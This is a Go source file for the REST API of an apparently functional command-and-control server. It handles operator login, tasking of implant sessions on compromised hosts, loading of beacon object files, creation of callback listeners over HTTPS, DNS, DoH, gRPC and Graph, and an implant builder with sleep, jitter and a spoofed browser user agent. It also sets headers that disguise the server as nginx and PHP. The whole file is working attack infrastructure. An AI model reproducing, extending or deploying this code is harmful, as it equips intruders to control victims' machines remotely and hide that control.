package main

import (
        "encoding/json"
        "fmt"
        "log"
        "net"
        "net/http"
        "os"
        "strings"
        "sync"
        "time"

        "github.com/golang-jwt/jwt/v5"
)

// ======================== JWT AUTH — MULTI-OPERATOR ========================
//
// Operators are loaded from C2_OPERATORS env var:
//   C2_OPERATORS="alice:pass1,bob:pass2"
//
// Each JWT carries:
//   sub  = operator name (e.g. "alice")
//   role = "operator" (default) or "viewer" (read-only, future use)
//   iat  = issued-at
//   exp  = 24h expiry
//
// Fallback: if C2_OPERATORS is not set, C2_PASSWORD is used as single
// "operator" account (backward compatible with existing deployments).
//
// Audit: every authenticated API call logs the operator name from the
// JWT sub claim — task attribution is now per-operator.
//
// BUILD COMPAT (Go 1.18+ module duplicate-import check): the previous
// second `import ("strings")` block collided with the strings import
// already declared at the top of the file. Go's older toolchain allowed
// duplicate imports across separate blocks; newer Go toolchains (1.21+)
// emit "strings redeclared in this block". The strings package is now
// imported exactly once at the top of the file. No behavior change.

// OperatorEntry — one named operator loaded from env
type OperatorEntry struct {
        Name     string
        Password string
        Role     string // "operator" | "viewer"
}

var operators []OperatorEntry

// LoadOperators — parse C2_OPERATORS env var.
// Format: "name:pass,name2:pass2" or "name:pass:role,..."
// Falls back to C2_PASSWORD as single operator if env is empty.
func LoadOperators() {
        raw := getEnv("C2_OPERATORS", "")
        if raw == "" {
                // Legacy single-operator fallback
                operators = []OperatorEntry{{
                        Name: "operator", Password: serverConfig.Password, Role: "operator",
                }}
                log.Println("[AUTH] Single-operator mode (set C2_OPERATORS for named operators)")
                return
        }
        operators = nil
        for _, entry := range strings.Split(raw, ",") {
                parts := strings.SplitN(strings.TrimSpace(entry), ":", 3)
                if len(parts) < 2 || parts[0] == "" || parts[1] == "" {
                        log.Printf("[AUTH] WARN: skipping malformed operator entry: %q", entry)
                        continue
                }
                role := "operator"
                if len(parts) == 3 && parts[2] == "viewer" {
                        role = "viewer"
                }
                operators = append(operators, OperatorEntry{Name: parts[0], Password: parts[1], Role: role})
        }
        if len(operators) == 0 {
                log.Fatalf("[AUTH] FATAL: C2_OPERATORS set but no valid entries parsed — refusing to start without auth")
        }
        log.Printf("[AUTH] Loaded %d operator(s): %v", len(operators), operatorNames())
}

func operatorNames() []string {
        names := make([]string, len(operators))
        for i, o := range operators { names[i] = o.Name + "(" + o.Role + ")" }
        return names
}

// FindOperator — password check; returns matching entry or nil
func FindOperator(password string) *OperatorEntry {
        for i := range operators {
                if operators[i].Password == password {
                        return &operators[i]
                }
        }
        return nil
}

func GenerateJWT(name, role string) (string, error) {
        token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
                "sub":  name,
                "role": role,
                "iat":  time.Now().Unix(),
                "exp":  time.Now().Add(24 * time.Hour).Unix(),
        })
        return token.SignedString([]byte(serverConfig.JWTSecret))
}

// ValidateJWT — returns (valid, operatorName, role)
func ValidateJWT(tokenStr string) (bool, string, string) {
        token, err := jwt.Parse(tokenStr, func(t *jwt.Token) (interface{}, error) {
                return []byte(serverConfig.JWTSecret), nil
        })
        if err != nil || !token.Valid {
                return false, "", ""
        }
        claims, ok := token.Claims.(jwt.MapClaims)
        if !ok {
                return false, "", ""
        }
        name, _ := claims["sub"].(string)
        role, _  := claims["role"].(string)
        if role == "" { role = "operator" } // backward compat
        return true, name, role
}

// ======================== MIDDLEWARE ========================

func CORSMiddleware(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
                // ── Evasion: mask server identity, mimic nginx ──────────────────
                w.Header().Set("Server", "nginx/1.24.0")
                w.Header().Set("X-Powered-By", "PHP/8.1.0")
                w.Header().Del("X-Go-Version")
                // ── Security hardening ─────────────────────────────────────────
                w.Header().Set("X-Content-Type-Options", "nosniff")
                w.Header().Set("X-Frame-Options", "DENY")
                w.Header().Set("Referrer-Policy", "no-referrer")
                // ── CORS ───────────────────────────────────────────────────────
                // OPSEC FIX (audit Cloud BUG 1): Restrict CORS to a single origin.
                // OLD: Access-Control-Allow-Origin: * — any website could read
                // authenticated API responses if the operator's JWT leaked (e.g.,
                // via XSS in the BeaconConsole). NEW: default to localhost,
                // operator can set C2_ALLOWED_ORIGIN for remote deployments.
                allowedOrigin := os.Getenv("C2_ALLOWED_ORIGIN")
                if allowedOrigin == "" {
                        allowedOrigin = "https://127.0.0.1:5000"
                }
                // Only set Access-Control-Allow-Origin if the request's Origin
                // matches our allowed origin — prevents cross-origin reads
                w.Header().Set("Access-Control-Allow-Origin", allowedOrigin)
                w.Header().Set("Vary", "Origin")
                w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
                w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
                if r.Method == http.MethodOptions {
                        w.WriteHeader(http.StatusOK)
                        return
                }
                next.ServeHTTP(w, r)
        })
}

func LogMiddleware(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
                // Skip noisy polling endpoints — only log meaningful requests
                if r.Method == http.MethodGet {
                        switch {
                        case r.URL.Path == "/api/dashboard/stats",
                                r.URL.Path == "/api/sessions",
                                r.URL.Path == "/api/listeners",
                                r.URL.Path == "/api/health",
                                r.URL.Path == "/api/graph/network",
                                r.URL.Path == "/api/graph/attack",
                                strings.HasPrefix(r.URL.Path, "/api/sessions/") && !strings.HasSuffix(r.URL.Path, "/task"):
                                next.ServeHTTP(w, r)
                                return
                        }
                }
                log.Printf("[HTTP] %s %s from %s", r.Method, r.URL.Path, r.RemoteAddr)
                next.ServeHTTP(w, r)
        })
}

// viewerBlockedPaths — POST/DELETE paths that viewer role cannot access.
// Viewers can GET sessions, graph, stats — but cannot task, kill, build.
var viewerBlockedPaths = []string{
        "/api/sessions/",   // POST task, DELETE kill
        "/api/listeners",   // POST create, DELETE remove
        "/api/builder/",    // POST build
        "/api/admin/",      // POST admin actions
}

func isViewerBlocked(method, path string) bool {
        if method == "GET" { return false } // GET always allowed
        for _, prefix := range viewerBlockedPaths {
                if strings.HasPrefix(path, prefix) { return true }
        }
        return false
}

func AuthMiddleware(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
                token := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
                ok, opName, role := ValidateJWT(token)
                if token == "" || !ok {
                        writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "unauthorized"})
                        return
                }
                // Viewer role enforcement — read-only access
                if role == "viewer" && isViewerBlocked(r.Method, r.URL.Path) {
                        writeJSON(w, http.StatusForbidden, map[string]string{
                                "error": "viewer role: read-only access — this action requires operator role",
                        })
                        return
                }
                r.Header.Set("X-Operator", opName)
                r.Header.Set("X-Role", role)
                next.ServeHTTP(w, r)
        })
}

// ======================== HELPERS ========================

func writeJSON(w http.ResponseWriter, status int, data interface{}) {
        w.Header().Set("Content-Type", "application/json")
        w.WriteHeader(status)
        json.NewEncoder(w).Encode(data)
}

func readJSON(r *http.Request, v interface{}) error {
        return json.NewDecoder(r.Body).Decode(v)
}

// ======================== ROUTES ========================

func SetupAPIRoutes(mux *http.ServeMux) {
        mux.HandleFunc("POST /api/login", handleLogin)
        mux.Handle("GET /api/dashboard/stats", AuthMiddleware(http.HandlerFunc(handleDashboardStats)))
        mux.Handle("GET /api/sessions", AuthMiddleware(http.HandlerFunc(handleListSessions)))
        mux.Handle("GET /api/sessions/", AuthMiddleware(http.HandlerFunc(handleGetSession)))
        mux.Handle("DELETE /api/sessions/", AuthMiddleware(http.HandlerFunc(handleKillSession)))
        mux.Handle("POST /api/sessions/", AuthMiddleware(http.HandlerFunc(handleSessionTask)))
        mux.Handle("GET /api/listeners", AuthMiddleware(http.HandlerFunc(handleListListeners)))
        mux.Handle("POST /api/listeners", AuthMiddleware(http.HandlerFunc(handleCreateListener)))
        mux.Handle("DELETE /api/listeners/", AuthMiddleware(http.HandlerFunc(handleRemoveListener)))
        // Malleable profiles — feeds the builder dialog combo box
        mux.Handle("GET /api/profiles", AuthMiddleware(http.HandlerFunc(handleListProfiles)))
        // ── v8 graph data plane (Phase D/E — ui/graph views) ──────────────
        mux.Handle("GET /api/graph/attack", AuthMiddleware(http.HandlerFunc(handleAttackGraph)))
        mux.Handle("GET /api/graph/network", AuthMiddleware(http.HandlerFunc(handleNetworkGraph)))
        mux.Handle("GET /api/admap/", AuthMiddleware(http.HandlerFunc(handleGetAdMap)))
        mux.Handle("POST /api/builder/generate", AuthMiddleware(http.HandlerFunc(handleBuilderGenerate)))
        mux.Handle("POST /api/builder/build", AuthMiddleware(http.HandlerFunc(handleBuilderBuild)))
        mux.Handle("GET /api/builder/builds", AuthMiddleware(http.HandlerFunc(handleListBuilds)))
        mux.Handle("POST /api/admin/reload-blocklist", AuthMiddleware(http.HandlerFunc(handleReloadBlocklist)))
        mux.HandleFunc("GET /api/health", handleHealth)
}

// ======================== AUTH ========================

// ── Cloud IMP-1 FIX: Per-IP login rate limiting ──────────────────────────
// A failed login from a single IP now triggers progressive throttling:
//   - 5 failed attempts within a 1-minute rolling window → 15-minute lockout
// A successful login clears the counter for that IP. This blocks credential
// brute-force / password-spray attacks at the API edge before they reach
// the operator table. State is process-local (resets on restart) — adequate
// because JWTs themselves expire in 24h and operators can re-login.
//
// Design: sync.Mutex-guarded map[string]*loginAttempt. A pointer value lets
// us mutate count/lockedUntil in place without re-inserting the map entry.
type loginAttempt struct {
        count        int
        firstAttempt time.Time
        lockedUntil  time.Time // zero value = not currently locked
}

var (
        loginLimiterMu sync.Mutex
        loginLimiter   = map[string]*loginAttempt{}
)

const (
        loginMaxAttempts   = 5                // failed attempts before lockout
        loginAttemptWindow = 1 * time.Minute  // rolling window for counting
        loginLockoutTime   = 15 * time.Minute // lockout duration after threshold
)

// clientIPFromRequest extracts the source IP (strips :port, handles IPv6).
// Falls back to the raw RemoteAddr if SplitHostPort fails (e.g., unix socket).
func clientIPFromRequest(r *http.Request) string {
        if host, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
                return host
        }
        return r.RemoteAddr
}

// loginRetryAfter returns how long the IP must wait before retrying, or 0 if
// not locked. Caller MUST hold loginLimiterMu.
func loginRetryAfter(ip string) time.Duration {
        a := loginLimiter[ip]
        if a == nil || a.lockedUntil.IsZero() {
                return 0
        }
        remaining := time.Until(a.lockedUntil)
        if remaining <= 0 {
                return 0
        }
        return remaining
}

// recordFailedLogin bumps the failed-attempt counter for an IP and engages
// the lockout once the threshold is hit. Caller MUST hold loginLimiterMu.
func recordFailedLogin(ip string) {
        now := time.Now()
        a := loginLimiter[ip]
        if a == nil {
                loginLimiter[ip] = &loginAttempt{count: 1, firstAttempt: now}
                return
        }
        // Reset the rolling window if the last burst was more than a minute ago.
        if now.Sub(a.firstAttempt) > loginAttemptWindow {
                a.count = 1
                a.firstAttempt = now
                a.lockedUntil = time.Time{}
                return
        }
        a.count++
        if a.count >= loginMaxAttempts {
                a.lockedUntil = now.Add(loginLockoutTime)
        }
}

// recordSuccessfulLogin clears any failed-attempt state for the IP.
func recordSuccessfulLogin(ip string) {
        loginLimiterMu.Lock()
        delete(loginLimiter, ip)
        loginLimiterMu.Unlock()
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
        // ── Cloud IMP-1: rate-limit check BEFORE credentials are inspected ──
        ip := clientIPFromRequest(r)
        loginLimiterMu.Lock()
        if retryAfter := loginRetryAfter(ip); retryAfter > 0 {
                loginLimiterMu.Unlock()
                log.Printf("[AUTH] Login blocked — IP %s locked out (%v remaining)", ip, retryAfter.Round(time.Second))
                w.Header().Set("Retry-After", fmt.Sprintf("%d", int(retryAfter.Seconds())+1))
                writeJSON(w, http.StatusTooManyRequests, map[string]string{
                        "error":  "too many failed login attempts — try again later",
                        "retry":  retryAfter.Round(time.Second).String(),
                })
                return
        }
        loginLimiterMu.Unlock()

        var req struct {
                Password string `json:"password"`
        }
        if err := readJSON(r, &req); err != nil {
                writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid request"})
                return
        }
        op := FindOperator(req.Password)
        if op == nil {
                // ── Cloud IMP-1: count the failed attempt toward lockout ──
                loginLimiterMu.Lock()
                recordFailedLogin(ip)
                loginLimiterMu.Unlock()
                log.Printf("[AUTH] Login failed — bad password (remote: %s)", r.RemoteAddr)
                writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "invalid password"})
                return
        }
        token, err := GenerateJWT(op.Name, op.Role)
        if err != nil {
                writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "token generation failed"})
                return
        }
        // ── Cloud IMP-1: clear counter on success — honest operators stay unthrottled ──
        recordSuccessfulLogin(ip)
        log.Printf("[AUTH] Operator %q (%s) logged in from %s", op.Name, op.Role, r.RemoteAddr)
        writeJSON(w, http.StatusOK, map[string]string{"token": token, "operator": op.Name, "role": op.Role})
}

func handleHealth(w http.ResponseWriter, r *http.Request) {
        writeJSON(w, http.StatusOK, map[string]interface{}{"status": "ok", "version": "2.0.0", "uptime": time.Since(startTime).String()})
}

// ======================== DASHBOARD ========================

func handleDashboardStats(w http.ResponseWriter, r *http.Request) {
        writeJSON(w, http.StatusOK, GetDashboardStats())
}

// ======================== SESSIONS ========================

func handleListSessions(w http.ResponseWriter, r *http.Request) {
        writeJSON(w, http.StatusOK, sessionMgr.GetAllSessions())
}

func handleGetSession(w http.ResponseWriter, r *http.Request) {
        id := strings.TrimPrefix(r.URL.Path, "/api/sessions/")
        if s, ok := sessionMgr.GetSession(id); ok {
                // BUGFIX: was marshalling the LIVE *Session — raced with heartbeat
                // writers (LastSeen/CheckinNum/Tasks). Snapshot is marshal-safe.
                writeJSON(w, http.StatusOK, SnapshotSession(s))
        } else {
                writeJSON(w, http.StatusNotFound, map[string]string{"error": "session not found"})
        }
}

func handleKillSession(w http.ResponseWriter, r *http.Request) {
        if r.Method != http.MethodDelete {
                writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "method not allowed"})
                return
        }
        id := strings.TrimPrefix(r.URL.Path, "/api/sessions/")
        if _, ok := sessionMgr.GetSession(id); !ok {
                writeJSON(w, http.StatusNotFound, map[string]string{"error": "session not found"})
                return
        }
        sessionMgr.RemoveSession(id)
        writeJSON(w, http.StatusOK, map[string]string{"status": "killed"})
}

func handleSessionTask(w http.ResponseWriter, r *http.Request) {
        if r.Method != http.MethodPost {
                writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "method not allowed"})
                return
        }
        parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/sessions/"), "/")
        if len(parts) < 2 || parts[1] != "task" {
                writeJSON(w, http.StatusBadRequest, map[string]string{"error": "use /api/sessions/{id}/task"})
                return
        }
        var req struct {
                Command string `json:"command"`
                Args    string `json:"args"`
        }
        if err := readJSON(r, &req); err != nil || req.Command == "" {
                writeJSON(w, http.StatusBadRequest, map[string]string{"error": "command required"})
                return
        }
        // ── Malleable profile command interception ──────────────────────
        // `profile <name>` never reaches the agent as a raw command: the
        // server resolves the TOML profile and pushes an update_profile task
        // carrying the validated dialect JSON instead. Unknown names get an
        // immediate, human-readable reply (no task queued).
        if handled, taskCmd, taskArgs := TryProfileCommand(req.Command, req.Args); handled {
                if taskCmd == "" {
                        // usage error / unknown profile — reply inline
                        writeJSON(w, http.StatusBadRequest, map[string]string{"error": taskArgs})
                        return
                }
                if taskID, err := sessionMgr.AddTask(parts[0], taskCmd, taskArgs); err != nil {
                        writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
                } else {
                        writeJSON(w, http.StatusOK, map[string]string{"task_id": taskID, "status": "queued", "priority": "normal"})
                }
                return
        }
        // ── BOF command interception ────────────────────────────────────
        // `bof <name> [args]` never reaches the agent as text: the server
        // loads bofs/bofs_out/<name>.x64.o, packs args into the CS Beacon
        // format and queues a type:"bof" task with base64 coff+args.
        // Unknown BOF / bad args → HTTP 400, nothing queued, agent safe.
        // `boflist` and `bof` (no args) → HTTP 200 with INFO message
        // (server-side only — agent never sees these).
        if handled, taskCmd, taskArgs, isInfo := TryBofCommand(req.Command, req.Args); handled {
                if taskCmd == "" {
                        // Server-side response (info or error)
                        if isInfo {
                                // INFO: boflist, bof (no args) — return 200
                                writeJSON(w, http.StatusOK, map[string]string{"output": taskArgs})
                        } else {
                                // ERROR: unknown BOF, bad args — return 400
                                writeJSON(w, http.StatusBadRequest, map[string]string{"error": taskArgs})
                        }
                        return
                }
                log.Printf("[BOF] tasked %s on session %s", req.Args, parts[0])
                if taskID, err := sessionMgr.AddTask(parts[0], taskCmd, taskArgs); err != nil {
                        writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
                } else {
                        writeJSON(w, http.StatusOK, map[string]string{"task_id": taskID, "status": "queued", "priority": "normal"})
                }
                return
        }
        // ── STRICT validation gate ──────────────────────────────────────
        // Unknown or malformed commands are rejected HERE — they never
        // reach the agent, so a typo can never crash a beacon mid-op.
        if err := ValidateCommand(req.Command, req.Args); err != nil {
                log.Printf("[VALIDATE] rejected task for session %s: %v", parts[0], err)
                writeJSON(w, http.StatusBadRequest, map[string]string{"error": err.Error()})
                return
        }
        opName := r.Header.Get("X-Operator")
        if opName == "" { opName = "operator" }
        log.Printf("[TASK] %s -> session %s: %s %s", opName, parts[0][:8], req.Command, req.Args)
        if taskID, err := sessionMgr.AddTask(parts[0], req.Command, req.Args); err != nil {
                writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
        } else {
                priName := "normal"
                switch inferPriority(req.Command) {
                case PriorityUrgent: priName = "urgent"
                case PriorityHigh:   priName = "high"
                case PriorityLow:    priName = "low"
                }
                writeJSON(w, http.StatusOK, map[string]string{
                        "task_id":  taskID,
                        "status":   "queued",
                        "priority": priName,
                })
        }
}

// ======================== LISTENERS ========================

func handleListListeners(w http.ResponseWriter, r *http.Request) {
        writeJSON(w, http.StatusOK, listenerMgr.GetAllListeners())
}

// ============================================================
//  handleCreateListener — was: name + port only
//  Now: validates name + host + port + (HTTP protocols only) callback domain
//  SNI is optional (only included if user explicitly provides a value)
// ============================================================
func handleCreateListener(w http.ResponseWriter, r *http.Request) {
        var cfg ListenerConfig
        if err := readJSON(r, &cfg); err != nil {
            writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid request"})
            return
        }
        // ── Required fields validation (mirror of UI checks) ─────────────
        // name  : always required
        // port  : required for all network protocols (SMB is exempt — uses pipe)
        // domain: required for HTTP-based protocols (agent needs a callback host)
        // host  : required for network protocols (bind address); for SMB it's the pipe name
        if cfg.Name == "" {
            writeJSON(w, http.StatusBadRequest, map[string]string{"error": "listener name is required"})
            return
        }
        // Set default protocol BEFORE domain check (so empty-protocol requests still get validated)
        if cfg.Protocol == "" {
            cfg.Protocol = "https"
        }
        if cfg.Port <= 0 && cfg.Protocol != "smb" {
            writeJSON(w, http.StatusBadRequest, map[string]string{"error": "port is required"})
            return
        }
        // Domain required for HTTP-based protocols where the agent phones home
        httpProtocols := map[string]bool{
            "https": true, "http": true, "dns": true, "doh": true,
            "grpc": true, "graph": true,
        }
        if httpProtocols[cfg.Protocol] && cfg.Domain == "" {
            writeJSON(w, http.StatusBadRequest, map[string]string{
                "error": "callback domain is required for " + cfg.Protocol + " listeners",
            })
            return
        }
        if cfg.Host == "" {
            cfg.Host = "0.0.0.0"
        }
        // SNI stays optional — empty SNI is fine, listener uses its own domain for TLS
        if l, err := listenerMgr.AddListener(cfg); err != nil {
            writeJSON(w, http.StatusConflict, map[string]string{"error": err.Error()})
        } else {
            writeJSON(w, http.StatusCreated, l)
        }
    }

func handleRemoveListener(w http.ResponseWriter, r *http.Request) {
        if r.Method != http.MethodDelete {
                writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "method not allowed"})
                return
        }
        id := strings.TrimPrefix(r.URL.Path, "/api/listeners/")
        if err := listenerMgr.RemoveListener(id); err != nil {
                writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
        } else {
                writeJSON(w, http.StatusOK, map[string]string{"status": "removed"})
        }
}

// ======================== BUILDER ========================

func handleBuilderGenerate(w http.ResponseWriter, r *http.Request) {
        var req ImplantConfig
        if err := readJSON(r, &req); err != nil {
                writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid request"})
                return
        }
        if req.SleepTime <= 0 {
                req.SleepTime = 60
        }
        if req.Jitter <= 0 {
                req.Jitter = 0.2
        }
        if req.UserAgent == "" {
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        if req.OutputFormat == "" {
                req.OutputFormat = "exe"
        }
        if result, err := GenerateImplantConfig(req); err != nil {
                writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
        } else {
                writeJSON(w, http.StatusOK, result)
        }
}

// handleReloadBlocklist — hot-reload IP blocklist without restart
// POST /api/admin/reload-blocklist  (auth required)
func handleReloadBlocklist(w http.ResponseWriter, r *http.Request) {
        ReloadIPFilter()
        writeJSON(w, http.StatusOK, map[string]string{
                "status":  "reloaded",
                "message": "IP blocklist reloaded — new entries active immediately",
        })
}

// handleListBuilds — list all agent builds from agent_db
// GET /api/builder/builds  (auth required)
func handleListBuilds(w http.ResponseWriter, r *http.Request) {
        if agentStore == nil {
                writeJSON(w, http.StatusOK, []interface{}{})
                return
        }
        builds := agentStore.GetAllBuilds()
        // Strip PSKHex from response (never send to client — it's in vault only)
        type safeBuild struct {
                BuildID      string    `json:"build_id"`
                ListenerID   string    `json:"listener_id"`
                ListenerName string    `json:"listener_name"`
                PSKHash      string    `json:"psk_hash_prefix"` // first 16 chars only
                AgentName    string    `json:"agent_name"`
                OS           string    `json:"os"`
                Arch         string    `json:"arch"`
                Format       string    `json:"format"`
                C2Host       string    `json:"c2_host"`
                C2Port       int       `json:"c2_port"`
                C2Protocol   string    `json:"c2_protocol"`
                BuiltAt      string    `json:"built_at"`
        }
        safe := make([]safeBuild, 0, len(builds))
        for _, b := range builds {
                prefix := b.PSKHash
                if len(prefix) > 16 {
                        prefix = prefix[:16] + "..."
                }
                safe = append(safe, safeBuild{
                        BuildID:      b.BuildID,
                        ListenerID:   b.ListenerID,
                        ListenerName: b.ListenerName,
                        PSKHash:      prefix,
                        AgentName:    b.AgentName,
                        OS:           b.OS,
                        Arch:         b.Arch,
                        Format:       b.Format,
                        C2Host:       b.C2Host,
                        C2Port:       b.C2Port,
                        C2Protocol:   b.C2Protocol,
                        BuiltAt:      b.BuiltAt.Format("2006-01-02 15:04:05"),
                })
        }
        writeJSON(w, http.StatusOK, safe)
}
